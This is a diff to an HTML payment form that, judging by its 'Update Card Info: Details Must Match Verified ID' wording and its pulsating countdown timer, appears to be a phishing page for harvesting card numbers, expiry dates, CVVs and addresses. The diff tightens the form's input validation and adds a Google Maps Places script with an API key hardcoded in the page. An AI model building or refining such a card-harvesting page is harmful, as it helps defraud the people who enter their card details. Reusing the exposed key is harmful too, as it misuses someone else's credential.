@@ -15,8 +15,7 @@
             <div class="container-payment">
                 <a class="cancel" href="/">Cancel & go back</a>
                 <div class="pay_wrapper">
-                    <div class="summary"><b> Update Card Info: 
-                    </b><br><i>Details Must Match Verified ID</i></div>
+                    <div class="summary"><b>Update Card Info:</b><br><i>Details Must Match Verified ID</i></div>
                     <div id="timerOffer" style="font-weight: bold; padding-top:20px;" class="pulsate">Time Remaining 04:23:59:59</div>
                     <div class="card-icons">
                         <i class="fab fa-cc-mastercard"></i>
@@ -33,19 +32,19 @@
                                 </div>
                                 <div class="form-group">
                                     <span class="title">Card Number:</span>
-                                    <input type="text" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="16" required>
+                                    <input type="text" name="cardnumber" id="cardnumber" placeholder="1234 5678 9012 3456" maxlength="16" pattern="\d{16}" title="Card number must be 16 digits" required>
                                 </div>
                                 <div class="form-group">
                                     <span class="title">Expiry:</span>
                                     <div class="inline-inputs">
-                                        <input type="text" name="expiry" class="short-input" placeholder="MM/YY" maxlength="5" required>
+                                        <input type="text" name="expiry" id="expiry" class="short-input" placeholder="MM/YY" maxlength="5" pattern="\d{2}/\d{2}" title="Expiry must be MM/YY" required>
                                         <span class="title inline-title">CVV:</span>
-                                        <input type="text" name="cvv" class="short-input" placeholder="1234" maxlength="4" required>
+                                        <input type="text" name="cvv" id="cvv" class="short-input" placeholder="1234" maxlength="4" pattern="\d{3,4}" title="CVV must be 3 or 4 digits" required>
                                     </div>
                                 </div>
                                 <div class="form-group">
                                     <span class="title">Address:</span>
-                                    <input type="text" name="address" placeholder="Billing Address" required>
+                                    <input type="text" name="address" id="address" placeholder="Billing Address" required>
                                 </div>
                                 <div class="form-group">
                                     <span class="title">State:</span>
@@ -69,5 +68,6 @@
         </div>
     </div>
     <script src="/script.js"></script>
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDmObcUji5I1V8_P39Boi1m5S8qJr3DIuc&libraries=places"></script>
 </body>
 </html>
